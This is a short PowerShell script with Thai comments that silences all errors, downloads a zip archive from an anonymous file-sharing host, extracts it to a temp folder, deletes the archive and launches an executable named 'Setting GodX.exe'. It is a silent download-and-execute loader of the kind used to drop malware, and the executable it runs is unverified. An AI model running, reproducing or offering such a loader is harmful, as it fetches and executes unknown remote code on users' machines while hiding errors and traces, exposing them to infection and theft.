# ปิดการแสดงสถานะทุกอย่าง
$ErrorActionPreference = 'SilentlyContinue'

$exeName = "Setting GodX.exe"
$zipName = "Setting GodX.zip"
$url = "https://files.catbox.moe/afb9rh.zip"
$tempPath = "$env:TEMP\GodX_App"
$zipPath = "$tempPath\$zipName"

# 1. สร้างโฟลเดอร์ทำงานถ้ายังไม่มี
if (!(Test-Path $tempPath)) { New-Item -ItemType Directory -Path $tempPath | Out-Null }

# 2. ใช้ .NET ดึงไฟล์แบบ Streaming (เร็วกว่า Invoke-WebRequest และ BitsTransfer ในกรณีไฟล์ Zip ขนาดกลาง)
$wc = New-Object System.Net.WebClient
$wc.DownloadFile($url, $zipPath)

# 3. ใช้ .NET แตกไฟล์โดยตรง (วิธีนี้เร็วที่สุดในโลกของ PowerShell)
Add-Type -AssemblyName System.IO.Compression.FileSystem
[System.IO.Compression.ZipFile]::ExtractToDirectory($zipPath, $tempPath)

# 4. ลบไฟล์ Zip ทิ้งทันทีหลังแตกเสร็จเพื่อไม่ให้รก
Remove-Item $zipPath -Force

# 5. รันโปรแกรม
Start-Process "$tempPath\$exeName" -WorkingDirectory $tempPath
